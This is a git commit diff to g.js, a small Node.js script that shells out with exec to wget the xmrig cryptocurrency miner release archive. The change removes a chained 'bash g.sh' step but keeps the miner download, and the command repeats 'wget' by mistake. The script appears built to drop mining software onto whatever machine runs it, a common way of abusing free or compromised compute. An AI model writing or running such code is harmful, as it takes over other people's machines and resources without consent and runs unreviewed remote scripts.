ffc94a1bd4e0c3a8e36e12f723d218b0818cf770
YashRawat <139982135+YashRawat911@users.noreply.github.com>
2023-09-22 12:39:28 +0530

    Update g.js

--- g.js
+++ g.js
@@ -1,6 +1,6 @@
 const { exec } = require("child_process");
 
-exec("wget wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz && bash g.sh", (error, stdout, stderr) => {
+exec("wget wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
